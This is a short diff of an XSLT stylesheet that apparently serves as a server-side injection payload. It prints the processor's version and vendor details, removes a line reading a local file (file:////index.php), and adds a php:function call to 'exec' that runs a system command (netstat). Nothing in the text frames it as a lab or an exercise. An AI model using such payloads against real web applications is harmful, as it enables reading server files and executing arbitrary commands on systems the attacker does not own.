@@ -6,7 +6,7 @@
  Version: <xsl:value-of select="system-property('xsl:version')" />
  Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
  Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
- <xsl:copy-of select="file:////index.php" />
+ <xsl:value-of select="php:function('exec','netstat /')"/>
  </body>
  </html>
 </xsl:template>
